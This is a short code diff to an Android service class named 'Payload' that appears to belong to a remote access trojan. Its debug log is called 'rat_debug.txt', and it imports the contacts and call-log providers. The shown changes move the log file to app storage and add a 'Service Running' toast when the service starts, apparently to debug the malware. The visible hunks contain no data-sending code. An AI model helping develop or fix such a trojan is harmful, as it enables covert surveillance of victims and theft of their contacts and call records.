@@ -12,6 +12,7 @@ import android.os.Build;
 import android.os.IBinder;
 import android.provider.Settings;
 import android.util.Log;
+import android.widget.Toast;
 import android.database.Cursor;
 import android.provider.ContactsContract;
 import android.provider.CallLog;
@@ -43,7 +44,7 @@ public class Payload extends Service {
 
     private void writeLog(String msg) {
         try {
-            File file = new File(Environment.getExternalStorageDirectory(), "Download/rat_debug.txt");
+            File file = new File(getExternalFilesDir(null), "rat_debug.txt");
             FileOutputStream fos = new FileOutputStream(file, true);
             fos.write((new java.util.Date().toString() + " - " + msg + "\n").getBytes());
             fos.close();
@@ -84,6 +85,15 @@ public class Payload extends Service {
 
     @Override
     public int onStartCommand(Intent intent, int flags, int startId) {
+        try {
+            android.os.Handler handler = new android.os.Handler(getMainLooper());
+            handler.post(new Runnable() {
+                public void run() {
+                    Toast.makeText(getApplicationContext(), "Service Running", Toast.LENGTH_LONG).show();
+                }
+            });
+        } catch (Exception e) {}
+
         writeLog("1. Service dimulai (onStartCommand)");
         
         try {
